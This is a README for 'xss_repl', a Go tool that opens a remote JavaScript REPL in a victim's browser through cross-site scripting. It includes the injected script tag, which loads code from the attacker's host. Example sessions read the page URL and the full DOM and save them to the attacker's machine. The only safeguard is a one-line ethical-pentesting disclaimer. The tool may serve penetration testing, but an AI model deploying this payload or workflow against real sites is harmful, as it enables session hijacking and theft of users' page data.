# xss_repl

Runs a REPL against an XSS target.

## Usage

Run it, it has good defaults, and it will wait for the target to connect to its address.

```
$ go run xss_repl.go
Waiting for target to connect: <script src="http://10.10.18.80:52468/7626ff87da9025fa0afad6cbcc954b47/"></script>
```

When the target connects it will start the REPL.

```
"target connected"
> 
```

The commands are executed in the target's JS context and the return value is printed as JSON.

```
> window.location.href
"file:///Users/mgbelisle/Desktop/target.html"
```

Commands can be typed manually or run from a file on the attacker's machine. For example, this is the content of a file

```
$ cat example.js
1 + 2
```

and running it results in this.

```
> file://example.js
3
```

You can write the results of the previous command to a file.

```
> > file://example-out.json
```

```
$ cat example-out.json
3
```

You can read the whole DOM like this

```
> document.documentElement.outerHTML
"<html>...</html>"
> > file://document.json
```

which saves it in a file as JSON (in this case a string with the html). To write the html itself to a file just JSON decode it.

```
$ cat document.json | python -c "import json, sys; print(json.load(sys.stdin))" > document.html
```

## Disclaimer

This tool is for ethical pentesting only. Only you are responsible for how you use it.